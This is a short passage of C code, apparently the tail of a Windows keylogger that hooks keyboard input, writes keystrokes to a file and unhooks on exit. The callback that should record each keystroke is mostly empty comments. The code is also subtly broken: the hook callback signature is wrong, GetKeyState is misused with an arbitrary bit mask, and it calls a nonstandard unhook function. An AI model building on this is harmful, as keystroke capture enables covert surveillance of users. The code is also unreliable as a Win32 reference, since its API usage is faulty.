                // Handle other keys
            }
        }
        Sleep(100); // Prevent high CPU usage
    }

    UnhookKeyboard(hook);
    fclose(file);
    return 0;
}

// Callback function
LRESULT CALLBACK KeyboardCallback(int hDlg, int i, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_KEYDOWN) {
        BYTE modifiers = GetKeyState(wParam);
        // Check for Shift, Ctrl, Alt
        if (modifiers & 0x20) {
            // Modifier pressed
        }
        // Record the keystroke
    }
    return 0;
}
```

